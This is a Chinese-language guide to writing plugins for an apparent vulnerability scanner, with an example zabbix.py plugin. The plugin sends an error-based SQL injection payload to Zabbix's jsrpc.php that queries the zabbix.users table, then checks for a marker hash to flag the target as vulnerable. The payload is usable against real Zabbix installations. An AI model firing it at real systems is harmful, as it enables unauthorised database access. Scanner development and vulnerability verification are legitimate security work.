##插件编写规则

在 payload 文件夹下新增一个 .py 文件

 py 文件中主要是 exploit, verify 函数，功能分别是利用和验证, 函数返回值有三个值，第一个值是返回是否存在漏洞，返回 True 或者 False；第二个值是返回 url ,第三个值返回扫描结果。功能分别是利用和验证

*** 示例 (zabbix.py 为例) ***

```
#!/usr/bin/env python
#coding=utf8
#注意 URL 编码
import requests

def verify(arg):

    payload = "jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=(select%201%20from%20(select%20count(*),concat((select(select%20concat(cast(concat(0x7e,md5(321),0x7e)%20as%20char),0x7e))%20from%20zabbix.users%20LIMIT%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17&itemids[23297]=23297&action=showlatest&filter=&filter_task=&mark_color=1"

    url = arg + payload
    # url = urllib.quote(url)
    # print url
    try:
        r = requests.get(url , timeout=5)
        if 'caf1a3dfb505ffed0d024130f58c5cfa' in r.text:
            msg = 'vul'
            return True, arg, msg
        else:
            msg = 'safe'
            return False, arg, msg
    except Exception, e:
        msg = 'safe'
        return False, arg, msg
def exploit(arg):
    pass

```
上面函数都可以自己定义，最后通过 requests 函数发包.
